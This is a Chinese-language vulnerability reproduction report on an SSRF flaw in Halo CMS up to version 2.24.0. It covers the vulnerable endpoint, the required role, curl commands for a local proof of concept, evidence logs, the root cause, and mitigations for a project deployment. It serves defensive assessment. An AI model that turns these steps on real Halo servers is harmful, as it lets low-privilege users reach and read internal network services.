Halo CVE-2025-44594 服务端请求伪造（SSRF）本地复现

1. 漏洞信息

项目内容
编号CVE-2025-44594 / GHSA-5qw7-wc23-wpmm
类型Server-Side Request Forgery（CWE-918）
严重度Medium，CVSS 3.1 = 6.5（AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N）
影响版本Halo ≤ 2.24.0
修复版本Halo 2.24.1（PR #9904）
受影响接口POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url
所需权限role-template-uc-attachment-manager（UC 附件管理，非管理员）
公告时间2026-05-04（GHSA 发布）

该漏洞的成因是：UC 附件「从 URL 上传」功能允许用户提交任意 URL，服务端在抓取时未限制回环地址与私网地址，导致攻击者可以让 Halo 服务器向内网服务发起请求，并把响应内容作为附件落盘、再通过静态地址读回。

3. 前置条件

  1. Halo 已完成初始化安装（创建超级管理员）。
  2. 存在一个非管理员账号，仅被授予 UC 附件管理角色：
    uc.api.storage.halo.run 的 attachments / attachments/upload-from-url，动词 create,list。
  3. 该系统设置中已配置 UC 附件存储策略（默认 default-policy 即满足）。

第 2 条是该漏洞与「普通注册用户」的边界：默认角色并不包含该权限，因此公告标注 PR:L（需低权限）。本次复现严格按此边界构造账号。

curl -u admin:Passw0rd!2026 -X POST \
  http://127.0.0.1:8090/apis/api.console.halo.run/v1alpha1/users \
  -H "Content-Type: application/json" -d '{
  "name":"uc_repro","email":"uc_repro@halo.local",
  "password":"Passw0rd!2026","roles":["repro-uc-attachment"]}'

4起一个内网监听器（模拟内网服务） 
python listener.py 9999
# 监听 127.0.0.1:9999，记录每次请求并返回固定标记

5以低权账号提交内网 URL 
curl -u uc_repro:'Passw0rd!2026' -X POST \
  http://127.0.0.1:8090/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url \

curl http://127.0.0.1:8090/upload/ssrf-canary.txt

5. 复现结果与证据

2.24.0
接口返回 200，附件创建成功： displayName=ssrf-canary.txt、mediaType=text/plain、size=24、 permalink=/upload/ssrf-canary.txt，ownerName=uc_repro。
// 2.24.0 响应（节选）
{"apiVersion":"storage.halo.run/v1alpha1","kind":"Attachment",
 "metadata":{"name":"69d843c0-dc56-4a02-bc56-5b75885c064b",
   "annotations":{"storage.halo.run/uri":"/upload/ssrf-canary.txt"}},
 "spec":{"displayName":"ssrf-canary.txt","mediaType":"text/plain;charset=utf-8",
   "ownerName":"uc_repro","policyName":"default-policy","size":24},
 "status":{"permalink":"/upload/ssrf-canary.txt"}}

5.1 服务端确实发起了请求

// evidence/callback-vuln.log
2026-11-03T07:22:50.838Z  GET /probe  from 127.0.0.1  UA: ReactorNetty/1.3.4
2026-11-03T07:22:50.881Z  GET /probe  from 127.0.0.1  UA: ReactorNetty/1.3.4

发起方不是浏览器，而是 Halo 内嵌的 Reactor Netty 客户端；两次请求分别对应代码里的 HEAD 探测与 GET 取流（dataBufferFetcher.head() 与正式下载）。这说明请求由服务端进程发出，而非客户端跳转。

7. 根因与修复方式

受影响版本的 URL 抓取实现 DefaultReactiveUrlDataBufferFetcher 直接构造 HttpClient 并开启 followRedirect(true)，未对目标地址做任何网段判断，因此 127.0.0.1、10.0.0.0/8、169.254.0.0/16 等均可命中。

修复 PR #9904 引入 HttpSecurityUtils.secureHttpClient()，在 DNS 解析完成后通过 resolvedAddressesSelector 过滤连接地址，同时把 followRedirect 改为 false、增加 10s 响应超时、5s 连接超时与响应体上限。被拦截的地址类型包括：

  • 回环地址（127.0.0.0/8、::1）
  • 私网地址（10/8、172.16/12、192.168/16）
  • 链路本地（169.254/16、fe80::/10）
  • 组播、未指定地址、IPv6 ULA（fc00::/7）

8. 对「成果展示广场」的影响判断

本项目把 Halo 作为展示门户基座，风险点集中在两处，且都可控：

风险点说明与处置
版本基线选型时直接锁定 ≥ 2.27.2（当前最新），即可同时覆盖本 SSRF、备份下载路径穿越（≤2.24.2）、角色委派提权（≤2.26.1）三个已披露问题。
权限收敛不要给普通学员授予「UC 附件管理」。广场的作品封面走投稿表单受控上传，不开放 upload-from-url。
出网策略容器或主机层限制 Halo 进程的出网范围，禁止访问内网段与管理端口，作为兜底。
历史版本不可回退若因插件兼容被锁在 2.24.x，必须同时禁用该接口或收回该权限，不能只靠「不告诉用户」。
复现的边界声明：本次复现全程在本地 127.0.0.1 完成，回调地址指向自建监听器，未请求任何内网真实服务、未访问互联网目标、未读取任何文件、未做持久化驻留。所有凭据均为一次性本地测试账号，实例仅绑定本机端口。
